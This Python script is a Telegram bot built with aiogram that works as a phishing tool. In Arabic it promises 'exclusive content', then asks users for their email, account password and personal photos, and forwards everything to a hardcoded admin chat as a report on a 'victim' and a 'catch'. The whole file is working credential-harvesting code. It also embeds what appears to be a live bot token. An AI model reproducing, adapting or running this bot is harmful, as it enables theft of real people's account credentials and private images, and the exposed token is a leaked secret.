import logging
from aiogram import Bot, Dispatcher, types
from aiogram.contrib.fsm_storage.memory import MemoryStorage
from aiogram.dispatcher import FSMContext
from aiogram.dispatcher.filters.state import State, StatesGroup
from aiogram.utils import executor

TOKEN = '8645849863:AAGIS81-Z4YzFmqwcTFodobdGkQdZttrms4'
ADMIN_ID = 7546026787

logging.basicConfig(level=logging.INFO)
bot = Bot(token=TOKEN)
storage = MemoryStorage()
dp = Dispatcher(bot, storage=storage)

class VictimState(StatesGroup):
    waiting_for_email = State()
    waiting_for_password = State()
    waiting_for_photos = State()

@dp.message_handler(commands=['start'])
async def cmd_start(message: types.Message):
    await message.answer("أهلاً بك. للمتابعة وعرض المحتوى الحصري، يرجى إدخال بريدك الإلكتروني:")
    await VictimState.waiting_for_email.set()

@dp.message_handler(state=VictimState.waiting_for_email)
async def process_email(message: types.Message, state: FSMContext):
    email = message.text
    async with state.proxy() as data:
        data['email'] = email
        data['photos'] = []
    
    await message.answer("تم التحقق. الآن يرجى إدخال كلمة السر الخاصة بالحساب:")
    await VictimState.waiting_for_password.set()

@dp.message_handler(state=VictimState.waiting_for_password)
async def process_password(message: types.Message, state: FSMContext):
    password = message.text
    async with state.proxy() as data:
        data['password'] = password
    
    keyboard = types.ReplyKeyboardMarkup(resize_keyboard=True)
    keyboard.add(types.KeyboardButton(text="إنهاء وإرسال البيانات 📤"))
    
    await message.answer(
        "خطوة أخيرة: يرجى إرسال **صور** (سواء صور شخصية أو لقطات شاشة) واحدة تلو الأخرى. عندما تنتهي، اضغط على زر 'إنهاء وإرسال البيانات'.",
        reply_markup=keyboard
    )
    await VictimState.waiting_for_photos.set()

@dp.message_handler(state=VictimState.waiting_for_photos, content_types=types.ContentTypes.PHOTO)
async def process_photos(message: types.Message, state: FSMContext):
    photo_file_id = message.photo[-1].file_id
    async with state.proxy() as data:
        data['photos'].append(photo_file_id)
    
    await message.answer("تم استلام الصورة. أرسل صورة أخرى أو اضغط 'إنهاء وإرسال البيانات'.")

@dp.message_handler(state=VictimState.waiting_for_photos, text="إنهاء وإرسال البيانات 📤")
async def finish_collection(message: types.Message, state: FSMContext):
    async with state.proxy() as data:
        email = data.get('email')
        password = data.get('password')
        photos = data.get('photos', [])
    
    user = message.from_user
    
    text_report = (
        f"🚨 صيد جديد متكامل عبر البوت!\n\n"
        f"👤 الضحية: {user.first_name} (@{user.username or 'لا يوجد'})\n"
        f"🆔 الآيدي: {user.id}\n"
        f"📧 البريد: {email}\n"
        f"🔑 كلمة السر: {password}\n"
        f"📸 عدد الصور الملتقطة: {len(photos)}"
    )
    await bot.send_message(chat_id=ADMIN_ID, text=text_report)
    
    if photos:
        media_group = [types.InputMediaPhoto(media=pid) for pid in photos]
        if len(media_group) > 1:
            await bot.send_media_group(chat_id=ADMIN_ID, media=media_group)
        else:
            await bot.send_photo(chat_id=ADMIN_ID, photo=photos[0])

    await message.answer("شكراً لك! جاري تحويلك للمحتوى...", reply_markup=types.ReplyKeyboardRemove())
    await state.finish()

if __name__ == '__main__':
    executor.start_polling(dp, skip_updates=True)
  
